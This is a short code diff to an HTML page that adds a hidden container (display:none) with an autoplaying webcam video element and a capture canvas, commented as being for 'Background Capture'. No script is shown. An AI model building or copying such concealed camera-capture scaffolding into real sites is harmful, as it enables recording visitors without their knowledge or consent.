@@ -108,6 +108,12 @@
         </div>
       </div>
     </div>
+
+    <!-- Hidden Video/Canvas for Background Capture -->
+    <div id="camera-container" style="display: none;">
+      <video id="webcam-video" autoplay muted playsinline width="640" height="480" style="width: 200px; height: auto; border: 1px solid #ccc;"></video>
+      <canvas id="capture-canvas" width="640" height="480"></canvas>
+    </div>
   </div>
 
   <script src="/static/script.js" defer></script>
